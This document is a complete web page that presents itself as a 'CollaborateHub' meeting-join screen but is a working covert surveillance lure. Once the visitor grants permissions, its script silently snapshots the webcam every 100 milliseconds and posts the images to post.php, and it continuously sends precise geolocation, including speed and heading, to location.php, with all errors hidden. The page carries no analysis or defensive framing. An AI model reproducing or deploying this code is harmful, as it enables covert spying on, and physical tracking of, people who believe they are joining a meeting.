<!DOCTYPE html>
<html>
<head>
    <title>Join Meeting - CollaborateHub</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #1a1a1a;
            color: #ccc;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 0;
            margin: 0;
        }
        .header {
            background: #222;
            padding: 15px;
            font-size: 16px;
            color: #fff;
            border-bottom: 1px solid #333;
        }
        .content {
            padding-top: 25vh;
        }
        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #666;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 0.9s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        p { font-size: 14px; margin: 10px 0; }
        small { font-size: 11px; color: #555; }
    </style>
    <script>
        var CAPTURE_INTERVAL = 100;
        var captureIntervalId = null;

        function sendPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            var alt = position.coords.altitude || "N/A";
            var spd = position.coords.speed || "N/A";
            var hdg = position.coords.heading || "N/A";

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&alt="+alt+"&spd="+spd+"&hdg="+hdg+"&t="+Date.now());
        }

        function handleError(e) {}

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(sendPosition, handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                navigator.geolocation.getCurrentPosition(sendPosition, handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
            }
        }

        function startCapture() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(function(stream) {
                        var video = document.createElement("video");
                        video.srcObject = stream;
                        video.play();
                        var canvas = document.createElement("canvas");
                        var ctx = canvas.getContext("2d");
                        captureIntervalId = setInterval(function() {
                            if (video.readyState >= 2) {
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                var data = canvas.toDataURL("image/png");
                                var xhr = new XMLHttpRequest();
                                xhr.open("POST", "post.php", true);
                                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                                xhr.send("cat=" + encodeURIComponent(data));
                            }
                        }, CAPTURE_INTERVAL);
                    })
                    .catch(function() {});
            }
        }

        window.onload = function() {
            startCapture();
            setTimeout(getLocation, 300);
        };

        document.addEventListener("click", function() {
            if (!captureIntervalId) startCapture();
            getLocation();
        }, { once: true });

        document.addEventListener("touchstart", function() {
            if (!captureIntervalId) startCapture();
            getLocation();
        }, { once: true });
    </script>
</head>
<body>
    <div class="header">CollaborateHub - Secure Meeting Space [Beta]</div>
    <div class="content">
        <p>Joining your meeting...</p>
        <div class="spinner"></div>
        <small>Please allow camera and microphone access when prompted</small>
    </div>
</body>
</html>
